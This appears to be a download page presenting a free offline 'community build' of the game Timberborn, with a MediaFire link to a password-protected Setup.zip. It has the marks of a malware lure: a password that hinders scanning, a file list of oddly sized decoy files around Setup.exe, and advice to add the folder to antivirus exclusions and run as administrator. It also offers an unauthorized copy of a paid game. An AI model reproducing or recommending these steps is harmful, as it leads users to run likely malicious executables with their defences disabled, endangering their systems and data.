## 🎮 About the Game

Timberborn is a lumberpunk colony-sim city builder where beavers rebuild civilization against recurring droughts and toxic badwater. This standalone Community Edition ships the complete game as a self-contained package with no storefront required. All content updates are included, and the build runs fully offline on Windows 10/11.

For players who want the complete Timberborn beaver colony builder in one self-contained offline package.

> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.

## 📦 Package Features

- 🦫 **Beaver Colonies** — Manage hardworking beaver societies with individual needs, well-being, and family trees.
- 💧 **Dynamic Water Physics** — Realistic flowing water for irrigation, reservoirs, canals, and hydro-powered machinery.
- 🌵 **Droughts & Badwater** — Survive dry seasons and toxic water cycles with careful planning and storage.
- 🏗️ **Vertical Architecture** — Build multi-story timber structures upward with platforms, stairs, and elevated logistics.
- ⚙️ **Golems** — Automate labor with constructible mechanical workers that handle repetitive tasks.
- 🧵 **Ziplines & Transport** — Move beavers and goods across the colony using ziplines, pathways, and hauling networks.
- ⚔️ **Two Factions** — Play the nature-focused Folktails or the industry-driven Iron Teeth with unique buildings.
- 🗺️ **Map Editor** — Create and share custom terrain with the built-in in-game map editor.
- 🧩 **Modding Support** — Community mods are supported, extending buildings, mechanics, and quality-of-life features.
- 🌳 **Lumberpunk Aesthetic** — Wood-powered technology, machinery, and post-human world design.
- 📊 **Deep Simulation** — Food chains, science points, production pipelines, and population management systems.
- 🎮 **Sandbox & Challenge Modes** — Play relaxed sandbox sessions or tough survival scenarios with escalating drought cycles.
- 📦 **Self-Contained Package** — One independent release with no additional software required to run the game.
- 🔌 **Offline Ready** — The offline version runs without an internet connection after extraction.
- 🖥️ **Native Windows Build** — Standalone build for Windows 10/11, ready to play immediately.

- **Compression:** Lossless
- **Install Time:** ~3 minutes on SSD, ~8 minutes on HDD
- **Recoding:** none
- **Selective Download:** None — single complete package

## 📥 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the link below:
- **Download Link:** [https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)

### Step 2: Extract

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable (6.3 MB)
|-- scripts.lic <- Game scripts (53.6 MB)
|-- patch_1.bnk <- Audio banks (34.5 MB)
|-- res.pak <- Resources archive (10.2 MB)
|-- animations.dll <- Animation system (4.7 MB)
|-- update_1.res <- Update resources (4.5 MB)
|-- api.pak <- API modules (4.3 MB)
|-- settings.bin <- Configuration (4.2 MB)
|-- license.wem <- Audio assets (3.8 MB)
|-- global.cfg <- Global settings (3.7 MB)
|-- assets.wem <- Asset audio (3.6 MB)
|-- physics.sys <- Physics engine (3.2 MB)
|-- dlc.md5 <- DLC checksums (3.2 MB)
|-- launcher.dll <- Launcher library (3.1 MB)
|-- driver.umap <- Driver data (2.7 MB)
|-- installer.dat <- Installer data (2.2 MB)
|-- license.bank <- License data (2.0 MB)
|-- update_1.ini <- Update config (1.9 MB)
|-- driver.pak <- Driver archive (1.6 MB)
|-- localization.ini <- Language files (1.5 MB)
|-- uninstall.key <- Uninstall key (1.1 MB)
|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
|-- lang.sys <- Language system (0.8 MB)
|-- audio.res <- Audio resources (1 KB)
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the community build.
3. Enjoy the full experience!

> 💡 **Saves location:** `%LOCALAPPDATA%\Timberborn\Saved`

## 🐛 Troubleshooting

- **Antivirus false positive:** Add the game folder to exclusions.
- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
